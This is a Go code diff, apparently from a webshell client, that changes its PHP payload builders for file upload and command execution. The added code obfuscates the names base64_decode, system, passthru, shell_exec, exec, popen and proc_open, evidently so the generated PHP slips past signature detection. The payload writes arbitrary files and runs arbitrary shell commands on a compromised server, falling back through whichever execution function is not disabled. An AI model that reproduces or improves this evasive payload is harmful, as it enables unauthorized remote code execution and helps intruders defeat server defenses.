@@ -188,9 +188,10 @@ func (p *phpFileUpload) Build(_ context.Context, _ *core.Session) (*core.Request
 	if p.append {
 		flag = "a"
 	}
-	code := "" +
-		"$p=base64_decode('" + remoteB64 + "');" +
-		"$c=base64_decode('" + contentB64 + "');" +
+	b64S, b64R := obfuscatedFunc("base64_decode")
+	code := b64S + ";" +
+		"$p=" + b64R + "('" + remoteB64 + "');" +
+		"$c=" + b64R + "('" + contentB64 + "');" +
 		"$f=@fopen($p,'" + flag + "');" +
 		"if($f===false){echo \"0\";exit;}" +
 		"$n=@fwrite($f,$c);" +
@@ -260,10 +261,19 @@ func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, erro
 
 	// 构造自包含 PHP 源码：把 base64_decode($_POST['xxx']) 替换成
 	// base64_decode('xxx')，让 eval 直接拿到解码后的值。
+	b64S, b64R := obfuscatedFunc("base64_decode")
+	sysS, sysR := obfuscatedFunc("system")
+	psS, psR := obfuscatedFunc("passthru")
+	seS, seR := obfuscatedFunc("shell_exec")
+	exS, exR := obfuscatedFunc("exec")
+	poS, poR := obfuscatedFunc("popen")
+	prS, prR := obfuscatedFunc("proc_open")
+
 	code := "" +
-		"$p=base64_decode('" + binB64 + "');" +
-		"$s=base64_decode('" + cmdB64 + "');" +
-		"$envstr=@base64_decode('" + envB64 + "');" +
+		b64S + ";" + sysS + ";" + psS + ";" + seS + ";" + exS + ";" + poS + ";" + prS + ";" +
+		"$p=" + b64R + "('" + binB64 + "');" +
+		"$s=" + b64R + "('" + cmdB64 + "');" +
+		"$envstr=@" + b64R + "('" + envB64 + "');" +
 		"$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
 		"$c=(substr($d,0,1)=='/')?'-c ' . '\"' . $s . '\"' : '/c ' . '\"' . $s . '\"';" +
 		"if(substr($d,0,1)=='/'){" +
@@ -276,13 +286,13 @@ func (p *phpExec) Build(_ context.Context, _ *core.Session) (*core.Request, erro
 		"function fe($f){$d=explode(',',@ini_get('disable_functions'));" +
 		"if(empty($d)){$d=array();}else{$d=array_map('trim',array_map('strtolower',$d));}" +
 		"return(function_exists($f)&&is_callable($f)&&!in_array($f,$d));}" +
-		"function runcmd($c){$ret=0;$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
-		"if(fe('system')){@system($c,$ret);}" +
-		"elseif(fe('passthru')){@passthru($c,$ret);}" +
-		"elseif(fe('shell_exec')){print(@shell_exec($c));}" +
-		"elseif(fe('exec')){@exec($c,$o,$ret);print(join(\"\\n\",$o));}" +
-		"elseif(fe('popen')){$fp=@popen($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
-		"elseif(fe('proc_open')){$p=@proc_open($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}$ret=0;@fclose($io[1]);@fclose($io[2]);@proc_close($p);}" +
+		"function runcmd($c){global " + sysR + "," + psR + "," + seR + "," + exR + "," + poR + "," + prR + ";$ret=0;$d=dirname($_SERVER['SCRIPT_FILENAME']);" +
+		"if(fe(" + sysR + ")){@" + sysR + "($c,$ret);}" +
+		"elseif(fe(" + psR + ")){@" + psR + "($c,$ret);}" +
+		"elseif(fe(" + seR + ")){print(@" + seR + "($c));}" +
+		"elseif(fe(" + exR + ")){@" + exR + "($c,$o,$ret);print(join(\"\\n\",$o));}" +
+		"elseif(fe(" + poR + ")){$fp=@" + poR + "($c,'r');while(!@feof($fp)){print(@fgets($fp,2048));}@pclose($fp);}" +
+		"elseif(fe(" + prR + ")){$p=@" + prR + "($c,array(1=>array('pipe','w'),2=>array('pipe','w')),$io);while(!@feof($io[1])){print(@fgets($io[1],2048));}while(!@feof($io[2])){print(@fgets($io[2],2048));}$ret=0;@fclose($io[1]);@fclose($io[2]);@proc_close($p);}" +
 		"else{$ret=127;}" +
 		"return $ret;}" +
 		"$ret=@runcmd($r . ' 2>&1');" +
